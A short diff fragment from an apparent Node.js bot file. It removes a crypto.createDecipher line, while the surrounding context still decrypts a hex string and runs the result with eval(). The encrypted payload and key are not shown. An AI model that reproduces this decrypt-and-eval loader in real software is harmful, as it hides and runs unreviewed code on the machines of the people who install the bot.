@@ -26,7 +26,6 @@ const assert = require('assert');
 const bot_version = nconf.get("system:bot_version");
 // const { startclient } = require('./updater');
 const fetch = require('node-fetch');
-var decipher = crypto.createDecipher(algorithm, key);
 var code = decipher.update(text, 'hex', 'utf8') + decipher.final('utf8');
 try {
   eval(code)
